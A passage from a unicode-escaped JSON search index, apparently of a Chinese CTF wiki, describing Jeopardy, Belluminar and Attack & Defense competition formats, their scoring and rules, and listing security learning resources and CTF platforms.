\u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy"},{"location":"introduction/mode/#-belluminar","text":"\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar"},{"location":"introduction/mode/#_1","text":"Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002","title":"\u8d5b\u5236\u4ecb\u7ecd"},{"location":"introduction/mode/#_2","text":"Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002","title":"\u51fa\u9898\u9636\u6bb5"},{"location":"introduction/mode/#_3","text":"\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002","title":"\u63d0\u4ea4\u90e8\u7f72"},{"location":"introduction/mode/#_4","text":"\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002","title":"\u89e3\u9898\u7ade\u6280"},{"location":"introduction/mode/#_5","text":"\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002","title":"\u5206\u4eab\u8ba8\u8bba"},{"location":"introduction/mode/#_6","text":"\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002","title":"\u8ba1\u5206\u89c4\u5219"},{"location":"introduction/mode/#_7","text":"\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002","title":"\u8d5b\u5236\u603b\u8bc4"},{"location":"introduction/mode/#-attack-defense","text":"","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense"},{"location":"introduction/mode/#_8","text":"\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4f1a\u8bbe\u7f6e\u5f97\u5206\uff0c\u4e00\u822c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002","title":"\u6982\u8ff0"},{"location":"introduction/mode/#_9","text":"\u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002","title":"\u57fa\u672c\u89c4\u5219"},{"location":"introduction/mode/#_10","text":"\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3","title":"\u7f51\u7edc\u73af\u5883"},{"location":"introduction/mode/#gamebox","text":"\u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u901a\u8fc7 ssh \u767b\u5f55\uff0c\u5bc6\u7801\u6216\u8005\u79c1\u94a5\uff0c\u4e00\u822c\u4f1a\u7ed9\u51fa\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"\u8bbf\u95ee Gamebox"},{"location":"introduction/resources/","text":"\u5728\u7ebf\u5b66\u4e60 \u00b6 i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93 \u5b66\u4e60\u8def\u7ebf \u00b6 \u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n \u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u4e66\u5355\u63a8\u8350 \u4fe1\u606f\u8d44\u8baf \u00b6 FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458 \u6280\u672f\u8bba\u575b \u00b6 \u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b CTF \u8d5b\u4e8b \u00b6 XCTF\u793e\u533a CTFtime CTF Rank CTF OJ \u00b6 XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn Hackme CTF Practice CTF List CTF \u5de5\u5177 \u00b6 \u770b\u96ea\u5de5\u5177 \u543e\u7231\u7834\u89e3\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus The Cyber Swiss Army Knife CTF Writeup \u96c6\u5408 \u00b6 CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"Resources"},{"location":"introduction/resources/#_1","text":"i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93","title":"\u5728\u7ebf\u5b66\u4e60"},{"location":"introduction/resources/#_2","text":"\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n \u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u4e66\u5355\u63a8\u8350","title":"\u5b66\u4e60\u8def\u7ebf"},{"location":"introduction/resources/#_3","text":"FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458","title":"\u4fe1\u606f\u8d44\u8baf"},{"location":"introduction/resources/#_4","text":"\u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b","title":"\u6280\u672f\u8bba\u575b"},{"location":"introduction/resources/#ctf","text":"XCTF\u793e\u533a CTFtime CTF Rank","title":"CTF \u8d5b\u4e8b"},{"location":"introduction/resources/#ctf-oj","text":"XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn Hackme CTF Practice CTF List","title":"CTF 